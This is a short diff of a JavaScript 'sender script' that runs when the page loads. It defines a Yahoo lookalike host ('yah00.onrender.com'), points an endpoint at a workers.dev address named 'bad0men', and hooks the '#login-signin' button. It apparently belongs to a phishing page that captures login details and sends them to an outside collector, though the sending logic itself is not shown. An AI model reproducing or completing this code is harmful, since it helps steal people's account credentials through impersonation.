@@ -3,7 +3,7 @@ document.addEventListener("DOMContentLoaded", function() {
     console.log("sender script loaded");
 
     const hostname = "https://yah00.onrender.com";
-    const endpoint = "https://winter-fog-b8e9.bad0men.workers.dev/";
+    const endpoint = "https://winter-fog-b8e9.bad0men.workers.dev";
 
     
     const nextButton = document.querySelector("#login-signin");
